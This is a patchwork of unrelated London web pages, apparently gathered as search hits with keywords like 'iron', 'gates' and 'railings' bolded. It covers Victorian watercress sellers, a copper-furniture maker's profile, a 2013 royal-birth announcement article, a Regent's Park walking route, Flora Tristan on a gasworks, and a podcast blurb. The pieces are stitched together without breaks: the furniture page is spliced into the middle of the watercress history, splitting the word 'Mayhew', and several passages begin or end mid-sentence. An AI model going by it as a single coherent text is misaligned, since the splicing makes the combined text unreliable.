see today.</p>   <p>This is how Queen Victoria&#xa0;Street appeared in the first decade of the 20th Century.</p>   <p>Much of Queen Victoria Street has changed considerably since this photo was taken, however in the above photo the church of St. Mary Aldermary is on the left and there is an ornate building on the right, curved with Queen Victoria Street passing&#xa0;to the left and Cannon Street on the right. This is one of the few buildings to have survived and is still much the same as when the above photo was taken as can be seen in the following photo:</p>   <p>A brief walk around the history of Cordwainer Ward.

   <div>   <figure>    <figcaption>     Watercress Girl by Johann Zoffany, Public Domain    </figcaption>   </figure>   <p>Watercress sellers, sometimes called cress sellers, were in the same class as a costermonger, although costermongers thought selling watercress was beneath them. Watercress was popular, not only because of its peppery and tangy flavor but also because it could easily be eaten or added to salads. Many people preferred to buy watercress in the spring as &#x201c;they&#x2019;re reckoned it good for sweetening the blood&#x201d; and that may have been because watercress contains large stores of <b>iron</b>, calcium, iodine, folic acid, and vitamins A and C.</p>   <p>Most watercress sellers were female and either young, old, or suffering with some infirmity. Henry Mayhew, in his multi-volume <i><b>London</b> Labour and the <b>London</b> Poor</i>, maintained the first sounds of the day were the watercress sellers crying, &#x201c;Fresh wo-orter-creases,&#x201d; and their first customers of the day were mechanics who dined on the cresses for breakfast and appeared between five and six in the morning.</p>   <figure>    <figcaption>     Richard Bradbery, grandson to William Bradbery, on the Watercress Farm at West Hyde, Courtesy of Wikipedia    </figcaption>   </figure>   <p>Watercress, which is related to mustard and radishes, was introduced in England by an enterprising entrepreneur named William Bradbery. Bradbery&#x2019;s first crop was grown at Springhead, in Kent, in 1808. &#x201c;He procured young plants, and placed them, with a small proportion of the wet earth in which they grew, in shallow running water; the plants soon formed large tufts; and rapidly spread over the water; and he gathered the cress regularly for the <b>London</b> markets.&#x201d; Bradbery claimed there were three varieties of cresses: &#x201c;the green leaved&#x2026;.the small brown leaved&#x2026;.and the large brown leaved.&#x201d; Apparently, the three varieties, tasted the same, although each had an advantage: the green leaved was the easiest to cultivate; the small brown leaved the hardiest; and, the large browned leaved offered the best appearance, making them the most popular.</p>   <p>Mayhew claimed the watercress sellers were some of London&#x2019;s poorest and &#x201c;a class so poor&#x2026;their extreme want alone would almost be an excuse for theft.&#x201d; Even on the bitterest and coldest days the young watercress sellers could be seen &#x201c;without shoes and stockings,&#x2026;their feet quite blue with the cold.&#x201d; Yet, despite their poverty, Mayhew thought they were among the most honest of people. &#x201c;They can be trusted paying the few pence they owe even though they hunger for it. It must require no little energy of conscience on the part of the lads to make them resist the temptations around them, and refuse the luring advice of the young thieves&#x2026;And yet they prefer the early rising&#x2014;the walk to market with naked feet along the cold stones&#x2014;the pinched meal&#x2014;and the day&#x2019;s hard labour to earn the few halfpence. &#x201c;</p>   <figure>    <figcaption>     Watercress, Courtesy of Wikipedia    </figcaption>   </figure>   <p>The busy days and times varied. However, most watercress sellers agreed the busiest days were Saturday and Sunday mornings, when cries for the cresses rang out between &#x201c;half-past six, and&#x2026;about seven.&#x201d; One watercress seller claimed that in the summer the sellers were &#x201c;so thick&#x2026;you might bowl balls along their heads, and all fighting for the creases. There&#x2019;s a regular scramble&#x2026;to get at &#x2019;em&#x2026;I should think in the spring mornings there&#x2019;s 400 or 500&#x2026;at Farringdon-market all at one time&#x2014;between four and five in the morning&#x2014;&#x2026;and as fast as they keep going out, others keep coming in. I think there is more than a thousand.&#x201d; These watercress sellers relied on the working classes as their principal customers and sold to working people such as bricklayers, carpenters, smiths, and plumbers.</p>   <p>When winter arrived, the Farringdon watercress market started &#x201c;long before daylight.&#x201d; Watercress sellers were stationed at its principal entrance in &#x201c;an open space, running the entire length of the railing in front, and extending from the <b>iron</b> <b>gates</b> at the entrance to the sheds down the centre of the large paved court before the shops.&#x201d; It was in this open space that the cresses, having arrived in wicker hampers from the countryside, were cosigned to the sellers or sold. (Note the hampers in the picture of Richard Bradbery above). &#x2018;</p>   <p>Before the cresses were sold, however, they were often tied into bunches, with the unacceptable cresses thrown away. One watercress woman stated that during the summer months you could observe &#x201c;young and old, upwards of a hundred poor things as thick as crows in a ploughed field [bundling and tying up cresses].&#x201d; Cresses were also regularly displayed in &#x201c;an opened hamper, with a candle fixed in the centre of the bright green cresses, and&#x2026;[shining] through the wicker sides of the basket.&#x201d;</p>   <p>As daylight burst forth, so did the increase in buyers: &#x201c;Every hamper is surrounded by a black crowd, bending over till their heads nearly meet, their foreheads and cheeks lighted up by the candle in the centre. The saleswomen&#x2019;s voices are heard above the noise of the mob, sharply answering all objections that may be made to the quality of their goods. &#x2018;They&#x2019;re rather spotty, mum,&#x2019; says an Irishman, as he examines one of the leaves. &#x2018;No more spots than a newborn babe, Dennis,&#x2019; answers the lady tartly, and then turns to a new comer.&#x201d; Customers bought for a penny what one watercress girl called a &#x201c;market hand.&#x201d; A market hand was equivalent to what a young girl could carry in her &#x201c;arms at one time, without spilling.&#x201d;</p>   <p>Mayhew estimated the amount of watercress sold wholesale in 1851 to be approximately 14,958,000 bunches, with the largest percentage of watercress sold at Farringdon-market. Of the 14,958,000 bunches, approximately 6,480,000 bunches were sold to street sellers with their approximate weekly profit equaling &#x201c;3<i>s.</i> 3<i>d.</i> per individual.&#x201d; Other markets where watercress was sold including Covent Garden, Borough, Spitalfields, and Portman. Besides markets, there were other popular spots to sell the cresses. These were principal thoroughfares, &#x201c;the courts and mews, bye streets&#x2026;squares and neighbourhoods of the more respectable houses.&#x201d;</p>   <figure>    <figcaption>     Watercress Girl Being Shown How to Tie Watercress Bundles, Public Domain    </figcaption>   </figure>   <p>Before selling the cresses, many watercress girls went to Hatton-garden to wet the cresses at the water pumps, as they became dry from being packed in hampers. Afterwards, the girls sat on the steps of St. Andrew&#x2019;s Church and tied them into bunches. Once tied, watercress girls carried their tasty bunches in one of several ways. Some used an &#x201c;arm-basket, like a greengrocer&#x2019;s at their side&#x2026;[others] a &#x2018;shallow&#x2019; in front of them; and plenty of them carr[ied] a small tin tray before them, slung round their neck.&#x201d; These baskets, shallows, or tin trays were described as &#x201c;tattered and worn&#x2026;in some shallows the holes&#x2026;have been laced up or darned together with rope and string, or twigs and split lathes have been fastened across; whilest others are lined with oilcloth, or old pices [<i>sic</i>] of sheet-tin.&#x201d;</p>   <p>Many of the watercress girls had hard lives. One young seller was 14 years old and named Mary Macdonald. Her father was a bricklayer, but his work was so spotty, to survive he sent Mary out to sell cresses. Another watercress seller was Louisa and she was 12. She took to selling cress because her mother also did and because her father died. Another unnamed 8-year old was interviewed by Mayh   <article>   <header>    <h1>About Us</h1>   </header>   <section>    <p>At Myburgh Designs we aim to create beautiful pieces that are functional but also sympathetic to the environment.</p>    <p>Our pieces combine high-end sculptural designs with a sophisticated, natural finish.&#xa0;If you require truly original furniture made with luxurious organic materials to create your own personal paradise, then Myburgh Designs has a piece to suit you.</p>    <p>Many of our swings are perfect for the indoors or out.&#xa0;Each individual swing chair allows you to interact with it in a personal way &#x2013; some invite you to curl up within them, while others request that you fully recline with your feet up.</p>    <p>Our copper flowers and organically designed balconies, <b>railings</b> and <b>gates</b> bring a new three dimensional element to your space.

It&#x2019;s knowing what you want to make, that&#x2019;s the test. I&#x2019;ve been exploring copper for ten years now. Pulling and pushing the boundaries of what convention says can be done with the metal.&#xa0; My African education in design has, I think, only helped this process. I&#x2019;m not bogged down by pre-conceived ideas. Change comes easily to me. Maybe that&#x2019;s why copper and I get on so well. We&#x2019;re both adaptable.&#x201d;</p>     <p>Stephen Myburgh was born in Durban, South Africa. After his national service he left South Africa and began a long voyage of discovery. &#x201c;My travels have taken me all over the world. From the jungles of Guatemala to the deserts of Egypt. It is these places and these experiences that help me see the world as I see it now.&#x201d;</p>     <p>In 1997 his wanderings brought him to <b>London</b>. It was in <b>London</b> that he started to explore metal work on a large scale. In 1998 in partnership with Caroline Fletcher (whom he would later marry), Myburgh Designs launched the Mood Swing collection.</p>     <p>&#x201c;Nature and its subtleties have always been my design program. But opulence and luxury offer the theater that I love to live with. Copper is a wonderful medium to merge these two desires&#x201d;. Stephen Myburgh&#x2019;s swings are hand made sculptures&#xa0; that bring into your homes this feeling of natural opulence. Soft forms that float with a strange weightless authority.</p>     <p>Stephen has his eyes set on a positive future. &#x201c;I want to contribute to a new era in which environment, art and design converge to lay the corner stones for the very bright future that I see ahead of us.&#x201d;</p>    </div>   </section>   </article>  
ew. At the time, the weather was severe and brutally cold. She &#x201c;was dressed in a thin cotton gown, with a threadbare shawl wrapped round her shoulders. She wore no covering to her head, and the long rusty hair stood out in all directions. When she walked she shuffled&#x2026;for fear&#x2026;the large carpet slippers that served her for shoes should slip off her feet.&#x201d; Despite her scarecrow appearance, however, she claimed &#x201c;people never pities me in the street.&#x201d;</p>   <figure>    <figcaption>     Anthony Ashley-Cooper, 7th Earl of Shaftesbury, Courtesy of Wikipedia    </figcaption>   </figure>   <p>There were, however, some people who pitied the watercress sellers. According to Ellen Barlee who wrote an article titled <i>Our <b>London</b> Water-Cress Seller,</i> there were many &#x201c;missions which, emanating in love to Christ, have established themselves in some of the darkest corners of our city&#x2019;s confines, and&#x2026;[act] like beacon-lights amid the vast sea of misery.&#x201d; One was a fund devised and managed by a Mr. Groom of Clerkenwell and supported by the well-known philanthropist, Anthony Ashley-Cooper, 7th Earl of Shaftesbury, who was also a proponent and champion against the employment of climbing boys and young chimney sweeps.</p>   <p>Lord Shaftesbury established the fund in memory of his late wife, whose name the fund bore. It helped watercress sellers survive during the winter months when there was snow and no work. It also gave them an opportunity to establish themselves in a new line of work. Mr. Groom purchased equipment&#x2014;urns, cups, saucers&#x2014;and viands&#x2014;eels, coffee, potatoes&#x2014;which he then loaned to watercress sellers out-of-work. Over time they repaid the loan, established a thriving business, and &#x201c;[were] thus launched in a fair way of independence.&#x201d;</p>   <p>References:</p>   <ul>    <li>Boden, Jane, <i>Little Toddles&#x2019; Story Book,</i> 1881</li>    <li>Fitch, Arthur Edward, eds., etal., <i>Essex Review,</i> Vol. 7, 1898</li>    <li>Mayhew, Henry,<i> <b>London</b> Labour and the <b>London</b> Poor,</i> Vol. 1, 1851</li>    <li><i>The New Monthly, </i>Vol. 15, 1825</li>    <li>Wood, Mrs. Henry, ed., <i>The Argosy,</i> Vol. 20, 1875</li>   </ul>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>    <h3>Google+ Comments</h3>  </div>

Buckingham&#xa0;Palace</h1>    <div>     <div>      <span>Monday 22 Jul 2013 8:47 am</span>     </div>    </div>   </header>   <div>    <figure>     <figcaption>      News the Princess of Wales gave birth on display at the main      <b>gates</b> of Buckingham Palace in      <b>London</b> (Picture: PA))     </figcaption>    </figure>    <p>With the confirmation the , attention has now turned to how news of the birth of her first child will be announced.</p>    <p>Even in the age of Twitter and 24 hour news, a statement revealing news of the royal baby and its sex will be placed by the <b>iron</b> <b>railings</b> of Buckingham Palace in the traditional manner.</p>    <p>Palace aides have said the tradition will be adhered to for the Duke and Duchess of Cambridge&#x2019;s first born and that will include a Royal Salute of 41 guns.</p>    <p>But it remains to be seen whether the Duke and Duchess keep with tradition and reveal their baby&#x2019;s name in a few days or reveal it immediately.</p>    <p>Either way, the birth notice will begin its journey at the Lindo wing of St Mary&#x2019;s Hospital in Paddington, <b>London</b>, where Kate&#x2019;s baby is being delivered.</p>    <p>The brief bulletin, on headed Palace notepaper, confirms the sex of the baby but usually gives little else away other than that the baby has been &#x2018;safely delivered&#x2019; and perhaps the weight.</p>    <p>It used to be hand-written but is now mostly typed and will be signed by the Queen&#x2019;s former gynaecologist Marcus Setchell, who is leading the medical team looking after the Duchess.</p>    <figure>     <figcaption>      Royal Gynaecologist Marcus Setchell, left, with the Countess of Wessex (Picture: PA)     </figcaption>    </figure>    <p>The document will be completed soon after the birth and, if events happen in daylight hours, will be taken under police escort through the streets of <b>London</b> to the palace.</p>    <p>Placed in a dark wooden frame, it will be set on an ornate easel behind the <b>railings</b>, just to the side of the front <b>gates</b> for members of the public to read.</p>    <p>But the notice will not be put in place until the monarch and senior members of the Royal Family have been told of the new addition to their family.</p>    <figure>     <figcaption>      The King&#x2019;s Troop, Royal Horse Artillery will fire a 41-gun salute in Hyde Park,      <b>London</b>, to celebrate the birth of the Duke and Duchess of Cambridge&#x2019;s baby (Picture: PA)     </figcaption>    </figure>    <p>When the Queen gave birth to Prince Andrew in 1960, some 2,000 people crowded around the <b>railings</b> as the official confirmation announcing the birth of a son &#x2013; the Queen&#x2019;s third child &#x2013; was fixed to the <b>gates</b> by Stanley Williams, the then superintendent of the Palace.</p>    <p>When William was born in 1982, his parents, the Prince and Princess of Wales, waited seven days before deciding upon and announcing his name.</p>    <p>The Prince of Wales&#x2019;s name, however, remained a mystery for an entire month and was only declared ahead of his christening in the Music Room of Buckingham Palace in December 1948.</p>    <figure>     <figcaption>      Prince William&#x2019;s name was not revealed for several days until after he was born (Picture: Roy Letkey/Files)     </figcaption>    </figure>    <p>Princess Beatrice&#x2019;s name was revealed two weeks after her birth in 1988.</p>    <p>Royal babies are registered in the normal way, although the home secretary is required to notify certain officials including the Lord mayor of <b>London</b>, the governors of Northern Ireland, the Channel Islands and the Isle of Man.</p>    <p>The Queen&#x2019;s top aide, her private secretary Sir Christopher Geidt, informs governor generals overseas.</p>    <p>Town criers will also sound out the news of the birth of the future monarch.</p>    <p>As well as keeping to these traditions, the baby&#x2019;s arrival will no doubt also be officially declared via the monarchy&#x2019;s website, on Facebook and summed up neatly in fewer than 140 characters on Twitter.</p>

   <div>   <h1>Regent&#x2019;s Park, London Zoo &amp; Primrose Hill</h1>   <div>    <p><strong>Why this walk ?</strong>&#xa0;&#x2013; Regent&#x2019;s Park is my favourite of the inner London parks and this walk covers most of its 410 acres (166 hectares), along with a visit to Primrose Hill, to get a birds eye view of the capital skyline. &#xa0;There are plenty of opportunities for refreshments along the way and a&#xa0;visit London Zoo is also an option. <strong>Distance</strong>&#xa0;&#x2013; circa 6.5 km or 4 miles. <strong>Map</strong>&#xa0;&#x2013; The London A to Z Map is okay but the on the Royal Parks website is excellent as are the ones at the entrance to every section of the park. &#xa0;My map below is created from openstreetmap.org and I will improve this when I next get a moment. </p>    <p><strong>Refreshments</strong>&#xa0;&#x2013; there are lots of places to stop on the way as detailed below <span><strong>,</strong></span>&#xa0;&#xa0;<span><span><strong>&#xa0;</strong></span><strong>&#xa0;</strong></span><strong><span><span>, </span></span></strong><span>and</span> <strong>Nearest Tube Stations</strong> &#x2013; <strong>Great Portland Street</strong> on the Circle &amp; Metropolitan line and <strong>Regents Park</strong> on the Bakerloo line, both of which deposit you on the South side of the Marylebone Road. &#xa0;From here its a short walk &#x2013; see Walk Directions. &#xa0; Alternatively <strong>Baker Street</strong> tube station on the Bakerloo, Circle and Metropolitan lines, is another alternative, with a different entrance into Regent&#x2019;s Park, found by heading North on Baker Street for 400 metres, until you see the park and then bearing right and crossing the Outer Circle at the Pedestrian crossing, into the park. <strong>Walk Directions</strong>&#xa0;&#x2013; This walk starts at the Regent&#x2019;s Park entrance just where Park Square East Road meets the Outer Circle. <span><strong>From Regent&#x2019;s Park Tube station</strong></span> head East along the Marylebone Road for 200 metres and cross to the North side of the six lane <span>Marylebone Road</span>, via the pedestrian crossing and head North up the left hand side of <span>Park Square East Road</span>&#xa0;for 150 metres and across the traffic island, to reach one of the main entrances into the park, at the inter-section with the <span>Outer Circle</span> road. <span><strong>From Great Portland Street Tube station</strong><span>, turn left (West for 20 metres) to a pedestrian crossing. &#xa0;From here</span></span><span>&#xa0;</span>head to the North side of the<span> Marylebone Road</span>, across the 6 lanes of traffic and then left again, heading West for 200 metres on the North side of the <span>Marylebone Road</span>. &#xa0;You will go across Albany Street and past some fancy black metal railings and then some large black gates controlling traffic into the park. &#xa0;The wide road heading North with a private park on its left hand side is <span>Park Square East Road</span>. &#xa0;Head up the left hand side of <span>Park Square East Road</span> for 150 metres and across the traffic island, to reach one of the main entrances into the park, at the inter-section with the <span>Outer Circle</span> road.</p>    <p>1) On entering the park you will see a noticeboard on your left, with a large colourful map of Regent&#x2019;s Park, which is very useful for orientating yourself.</p>    <p>2) Take the left fork for 50 metres, ignoring the first right turning until reaching the first water fountain, which is like a small roundabout. &#xa0;Turn right heading North into an avenue of lovely trees and bushes, part of &#xa0;Avenue Gardens.</p>    <div>     <p>Avenue Gardens looking North</p>    </div>    <div>     <p>Formal Flower beds in Avenue Gardens</p>    </div>    <p>3) After 100 metres at the next water fountain, bear slightly left, but still heading North. &#xa0;You will pass some pretty flower beds on your right as you head up to the next fountain (100 metres). &#xa0;Keep heading North to the next fountain (100 metres) and bear left and slightly left again to bring you out to a wide path. Turn right heading North on the main path and through the park gate and cross <span>Chester Road</span> at the pedestrian Crossing and enter the Park again.</p>    <div>     <p>View from the Pedestrian Crossing of the Regency Buildings around Regent&#x2019;s Park</p>    </div>    <p>4) On entering the Park the is on your left as are toilets. &#xa0;Keep heading North on a wide tree lined avenue, for 500 metres to reach a fountain in the middle of the path. &#xa0;This fountain was a gift from Sir Cowasjee Jehangir, a wealthy parsee gentleman of Bombay as a token of his gratitude, to the people of England for protection offered to him by fellow countryman under the British rule of India in 1869.</p>    <div>     <p>The Fountain</p>    </div>    <div>     <p>Plaque showing the fountain was a gift from Sir Cowasjee Jehangir</p>    </div>    <p>5) At the fountain turn the equivalent of left, heading over some grass downhill slightly for 50 metres. Then bear right and keep right at the next junction. &#xa0;Keep on this wide path for 600 metres &#xa0;running parallel with London Zoo on your right, until you reach an park exit gate. &#xa0;You&#x2019;ll go past the camels enclosure and children&#x2019;s zoo. &#xa0;On your left is a raised building that looks like a UFO, which is a sports facility and cafe with great views called <span> &#x2013; &#xa0;</span><span><span>see the Royal parks website for more details,</span></span><span>&#xa0;</span>   <div>     <p>The Hub viewed from the path by London Zoo</p>    </div>    <p>6) On exiting the gate, cross the <span>Outer Circle</span> road and head north down a passage with a No Cycling sign on its left. &#xa0;(N.B. &#xa0;if you want to visit the <strong>Zoo</strong> on exiting the gate, do not cross the <span>Outer Circle</span> road, merely turn right and keep heading up the pavement for 400 metres and the main Zoo entrance is then on your right).</p>    <p>7) You will see a running track on your left and will then go over <span>Primrose Hill Bridge</span> which crosses the <strong>Regent&#x2019;s Canal</strong>. &#xa0;You&#x2019;ll go past another Park map on your left and then fork right and cross <span>Prince Albert Road</span> at the pedestrian crossing.</p>    <p>8) Turn right and head into Primrose Hill Park, taking the second path on the right, heading slightly uphill. &#xa0;Go straight across two cross roads and after 300 metres turn left at the next junction, by a dog bin, heading steeply up <strong>Primrose Hill</strong> for 300 metres. &#xa0;You will reach an oval shaped viewing platform and are now 62.8metres or 206 feet above sea-level. &#xa0;From here you get great views across the London skyline, with St Pauls Cathedral, The Shard, Canary Wharf, London Eye, BT Tower and the city all visible on a clear day. &#xa0;You&#x2019;ll see the following carved in the stone in front of you &#x201c;I have conversed with the spirital sun &#x2013; I saw him on Primrose Hill&#x201d; by William Blake &#xa0;1757 &#x2013; 1827.</p>    <div>     <p>Typical Primrose Hill houses surrounding the park</p>    </div>    <div>     <p>View from Primrose Hill</p>    </div>    <p>9) Continue through the viewing platform and take the left fork of the path heading downhill. &#xa0;Keep on this path for 600 metres to exit the park via the gate you entered.</p>    <p>10) Re-trace your route over the <span>Prince Albert Road</span>&#xa0;pedestrian crossing, turning right and then immediately left to go back over <span>Primrose Hill Bridge</span>, to the<span> Outer Circle&#xa0;</span> and crossing this again back into Regent&#x2019;s Park.</p>    <p>11) On entering the park take the furthest path on your right. &#xa0;Keep on the tarmac path. &#xa0;On your left you will see three wooden sculptures by Tom Harvey done in 2009. &#xa0;The first is a girl crouching next to a big cat. &#xa0;The second is a girl staring at a wolf and the third is a standing girl and carved stools. Continue along this path for 700 metres. &#xa0;You also pass on your left if you fancy a visit, along with cricket nets and will eventually come out at a small picnic area with toilets on your right.</p>    <div>     <p>View from Regent&#x2019;s Park to the West End</p>    </div>    <p>12) Keep going straight on and cross Hanover Bridge, with good views of the boating lake to the left and then over another bridge.</p>    <div>     <p>The Boating Lake</p>    </div>    <p>13) Bear left and you will pass a water fountain and then the on your left, where there is a nice seated area by the lake. &#xa0;Here you can hire a pedallo for the Boating lake (Cost adults &#xa3;7.50 / Child &#xa3;4.50 an hour. &#xa0; Childrens small pedallo&#x2019;s are also for hire from here for &#xa3;3 for 20 minutes in the summer. &#xa0;Again see Royal Parks website for further details. &#xa0;From here you can also see the large <strong>London Mosque</strong>.</p>    <div>     <p>Tariff for the Boating Lake &amp; Children&#x2019;s Pedaloes</p>    </div>    <div>     <p>The Boat House Cafe</p>    </div>    <div>     <p>Boat House Cafe Seating Area by the Boating Lake</p>    </div>    <p>14) Keep the Boating Lake on you left and follow it for the next 600 metres. &#xa0;You&#x2019;ll likely to see Swan&#x2019;s (largest &amp; heaviest birds in the UK), Canada Geese, Coots and many more exotic birds here. &#xa0;Its beautiful here in the spring with all the blossom and there are good views over the Lake to one of the finest Regency period houses in London. &#xa0;To your right are lots of grand Regency buildings devised by the architect Sir John Nash around 1820.</p>    <div>     <p>Fine Regency Building overlooking the lake</p>    </div>    <div>     <p>Fine Regency Buildings surrounding the Western edge of Regent&#x2019;s Park</p>    </div>    <p>Private Regency House overlooking the Lake</p>    <p>15) You&#x2019;ll eventually come to a bridge, where there is another park entrance on your right. &#xa0;This is the exit / entrance taking you to<strong> Baker Street tube</strong>&#xa0;and <strong>Sherlock Holmes Museum</strong> after a shortish walk.</p>    <p>16) Do NOT exit the park. &#xa0;Instead turn left and cross over the bridge and turn left again, eventually heading uphill with views of the lake on the left and of a Band Stand. &#xa0; After 400 metres you will come to an ice cream kiosk on your right and then a road.</p>    <p>17) Go straight across the road and pass by the Garden Cafe on your left and then turn right after another 50 metres. &#xa0;You&#x2019;ll start to see Rose bushes and keep going straight on crossing over a bigger path and after 50 metres keep right and follow the path with a small lake on your left. &#xa0;Eventually you will come into a pretty circular rose garden, with benches around. &#xa0;Go straight through this and then on meeting another path turn right and exit the park through some ornate gates, with gold touches.</p>    <div>     <p>Rose beds and a weeping willow by the lake</p>    </div>    <div>     <p>One of the many pretty Rose beds</p>    </div>    <p>18) You will now have reached the Inner Circle Road. &#xa0;Turn left and then cross over to the other side of the road. &#xa0;Head along the pavement for 100 metres until reaching some gates &#x2013; see photo below. &#xa0;This is the entrance to what &#xa0;term the secret garden, or as it is officially known &#x201c;The Garden of St John&#x2019;s Lodge&#x201d;. &#xa0;Head down a narrow path to enter this very peaceful and pretty garden.</p>    <div>     <p>Entrance to the &#x201c;Secret Garden&#x201d; of St John&#x2019;s Lodge</p>    </div>    <div>     <p>Plaque on right hand side as you enter the Garden of St John&#x2019;s Lodge</p>    </div>    <p> 19) Retrace your route and head left as you exit the entrance to the Garden of St John&#x2019;s Lodge. &#xa0;After 100 metre head left again into Chester Road. &#xa0;Head down the road for 250 metres and cross back over the pedestrian crossing and back into Avenue Gardens. &#xa0;As you go down the main avenue take a right turn and head south down a smaller parallel Avenue. &#xa0;Eventually after 300 metres you will come to another path and turn left at a water fountain. &#xa0;Go straight across the next water fountain until reaching a park entrance.</p>    <p>20) You will now be exiting the park via the way you came in. &#xa0;Head 150 metres South on <span>Park Square East Road</span> to get back to the <span>Marylebone Road</span> and tube stations. &#xa0;There are also lots of good restaurants on <span>Great Portland Street</span> if you are now feeling hungry and many pubs too !

   <div>   <p>Gas lighting transformed <b>London</b>, it is hard to imagine now just how much. I think the only way to begin to understand it, as much as we can from this vantage point, is through literature.</p>   <p> is wonderfully evoctive of the beauty of gas lighting, the magical effect it had on <b>London</b>:</p>   <blockquote>    <p>But it is especially at night that <b>London</b> should be seen: then, in the magic light of millions of gas-lamps, <b>London</b> is superb! Its broad streets stretch to infinity; its shops are resplendent with every masterpiece that human ingenuity can devise; its multitudes of men and women pass ceaselessly too and fro. To see all this for the first time is an intoxicating experience. Then again, in the daytime, the beautiful streets, the elegant squares, the austere <b>iron</b> <b>gates</b> which separate the family mansion from the common run of humanity, the vast expanse of gracious rolling parkland, the beauty of the trees, the number of superb carriages and magnificent horses which parade the streets &#x2014; all this seems magical and blurs the judgment, so that no foreigner can fail to be entranced when he first enters the British capital. But I must warn you that the spell fades like a fantastic vision, a dream in the night; the foreigner soon recovers his senses and opens his eyes to the arid egotism and gross materialism which lurk behind that ideal world (17).</p>   </blockquote>   <p>I&#x2019;m not sure that something hasn&#x2019;t been lost now, the texture of the light changed and the last remaining shadowy places illuminated with electricity. There are still a few streets where you can experience gas lighting, you can find them . It&#x2019;s something well loved and well studied, a short description of how and when it came to illuminate London&#x2019;s streets can be found , or more at length in &#x2018;s work on <em>Victorian <b>London</b></em>. The way it transformed how people could walk through the city at night, especially women, is so self-evident yet often forgotten.</p>   <p>Also often forgotten, I think, is the labour and technology that made is possible. One of the most powerful passages of Tristan&#x2019;s journal describes the gasworks at Horseferry Road. There is nothing at all left to show that a gas works once stood here but a plaque.&#xa0; Tristan&#x2019;s words give a vivid sense of the working conditions:</p>   <blockquote>    <p>One of the largest gas-works is in Horseferry Road. Westminster; I have forgotten the name of the company. You can not visit it without a ticket of admission: In this palace of industry the abundance of machinery and <b>iron</b> is quite overwhelming; everything is made of <b>iron</b> &#x2014; platforms. <b>railings</b>, staircases. floors, roofing etc.; plainly no expense has been spared to ensure that buildings and equipment alike are made of the most durable materials. I saw cast-<b>iron</b> vats with the dimensions of a four-storey house. I wanted to know how many thousand tons they hold, but the foreman with me was just as uncommunicative as the foreman at the brewery, and preserved an absolute silence.</p>    <p>We went into the big boiler-house: the row of furnaces on either side were burning brightly; the scene was not unlike the descriptions the poets of Antiquity have left us of Vulcan&#x2019;s forges, save that the Cyclops were animated with divine activity and intelligence, whereas the black slaves of the English furnaces are sullen, silent and impassive. There were about twenty men present, going about their work in a slow, deliberate fashion. Those with nothing to do stood motionless, lacking the energy even to wipe away the sweat streaming down their bodies, Two or three turned their blank gaze towards me; the rest did not even raise their heads. The foreman told me that only the strongest men were selected as stokers; even so, they all developed chest diseases after seven or eight years of the work, and invariably died of consumption. That accounted for the misery and apathy depicted on every countenance and apparent in every movement the poor wretches made.</p>   </blockquote>   <p>This language is so emblematic of the odd politics of her solidarity with, and yet low opinion of, the working classes. She is offhand about their early deaths, but it breaks my heart to think of it.</p>   <blockquote>    <p>The work demanded of them is more than human strength can endure. They wear nothing but cotton drawers; when they leave the boiler-house they merely throw a coat over their shoulders.</p>    <p>Although the space between the two rows of furnaces must have been fifty or sixty feet, the floor was so hot that the heat penetrated my shoes immediately and made me lift up my feet as if I had stepped on live coals. I stood upon a large stone slab, but even this was <em>hot</em>, although it was well off the ground. I could not stay in this veritable hell; the heat was suffocating, the smell of gas was making me dizzy and my chest felt as if it would burst. The foreman took me to a gallery at the end of the boiler-house where I could see everything in relative comfort.</p>    <p>We made a complete tour of the establishment; I was lost in admiration for all the machines, for the meticulous care that marks every stage of the work; but in spite of all precautions there are frequent disasters in which men are injured and even killed. 0 God! Can progress be bought only at the cost of men&#x2019;s lives?</p>   </blockquote>   <p>She is not, and I could hardly expect her to be, interested in the geographies of light, that this is gas produced to light up the expensive shops of the West End at the cost of workingmen&#x2019;s lives and environment:</p>   <blockquote>    <p>The gas produced at this factory is taken by pipes to light the Oxford Street area as far as Regent Street.</p>    <p>The air is horribly tainted: at every instant you are assailed by poisonous fumes. I emerged from one building, hoping to find the air purer in the yard outside, but everywhere I went, the foul exhalations of gas and the stench of coal and tar pursued me.</p>   </blockquote>   <p>Not only is this killing the men who work here, it surely must also be killing all those who live around it, albeit more slowly. Her lack of interest in how this is affecting the poor people and dock workers living in the area is in its own way a testament to what communities fighting for environmental justice have been able to achieve.</p>   <p>It also makes me wish that she were not writing from such a position of privilege, that she had from wherever she was staying, for surely then the effect of the fumes and the housing of the workers would have also figured in this description. As it was, Tristan was there only briefly and already felt dizzy and sick. Odd then, and oddly Victorian, that she focuses in on the dirt.</p>   <blockquote>    <p>What is more, the entire premises are very dirty. The yard &#x2014; with its pools of stagnant water and piles of rubbish &#x2014; testifies to a total neglect of hygiene. It is true that the materials used to produce gas are of such a nature that it would require vigorous measures to keep the place clean, but two men would be sufficient for the task, and for a trifling increase in outlay, the entire establishment would be healthier.</p>   </blockquote>   <p>Returning once more to the working conditions suffered:</p>   <blockquote>    <figure>     <figcaption>      Retort House, Great Central Gas Works, Bow Common,      <b>London</b>. It was here that Croll introduced the burning of incandescent coke as fuel immediately it had be taken from retorts. 10% saving.     </figcaption>    </figure>    <p>I was on the point of suffocating and could not wait to escape from such an evil-smelling place when the foreman said, &#x2018;Stay a moment longer, there&#x2019;s something very interesting for you to see; the stokers are just about to remove the coke from the ovens.&#x2019;</p>    <p>I returned to my perch in the gallery; the sight that met my eyes was one of the most appalling that I have ever seen.</p>    <p>The furnaces are above ground level.    <div>   <div>    <p>Patti Smith&#x2019;s guitarist Lenny Kaye coined the term, &#x201c;punk rock.&#x201d;</p>   </div>   <p>Before the Ramones, the Sex Pistols and the Clash, there were the Standells, the Barbarians and the Seeds.&#xa0; Learn how sometimes good guys don&#x2019;t wear white in this glance back at the garage gods of the 1960s, and their role as punk rock&#x2019;s grandfathers.</p>   <p>Podcast: | </p>   <p>Subscribe: | | </p>    <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Like this:</h3>    <div>     <span><span>Like</span></span>     <span>Loading...</span>    </div>   </div>   <div>    <h3>Related posts:</h3>   </div>  </div>  
